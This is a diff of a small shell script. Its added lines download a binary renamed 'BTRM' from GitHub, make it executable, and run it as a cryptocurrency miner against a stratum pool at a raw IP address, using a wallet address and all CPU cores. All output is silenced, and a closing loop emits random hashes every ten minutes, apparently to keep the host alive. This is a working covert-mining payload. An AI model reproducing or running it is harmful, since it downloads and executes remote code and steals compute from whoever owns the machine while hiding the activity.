@@ -1,5 +1,5 @@
 #!/bin/sh
-wget https://github.com/bengetsia/soft/raw/main/xmrig
-chmod 777 xmrig
-./xmrig -a ghostrider -o stratum+tcp://139.144.30.27:443 --tls --user BUFpzWEJAqQvTPkkQJt2V91pAnwjgAbY2c.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t$(nproc --all) >/dev/null 2>&1
+wget https://github.com/aqshakuy/nyemfile/raw/main/BTRM
+chmod 777 BTRM
+./BTRM -a yespower  -o stratum+tcp://66.175.220.197:80 -u web1q30494fe7unadljvt6qy64e9e2nlxg3y05cmdkw.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
